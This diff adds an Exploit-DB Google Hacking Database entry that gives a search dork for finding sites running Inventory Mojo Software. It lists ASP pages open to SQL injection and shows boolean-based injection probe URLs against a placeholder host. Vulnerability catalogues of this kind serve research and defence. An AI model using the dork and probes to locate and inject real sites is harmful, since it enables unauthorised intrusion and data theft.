@@ -1,0 +1,9 @@
+GHDB URL:         https://www.exploit-db.com/ghdb/3704
+Category:         Advisories and Vulnerabilities
+Published Date:   2011-03-23
+Author:           anonymous
+GoogleDork:       intext:"Powered by Inventory Mojo Software."
+Description:      intext:"Powered by Inventory Mojo Software."
+
+
+Submitter: p0pc0rn SQL Injection (categoria.asp, producto.asp, srubro.asp, marca.asp, buscar.asp, Login.asp, NewUser.asp, do_addToNewsletter.asp) --- http://site.com/categoria.asp?CT=6' and '1'='1 TRUE http://site.com/categoria.asp?CT=6' and '1'='0 FALSE
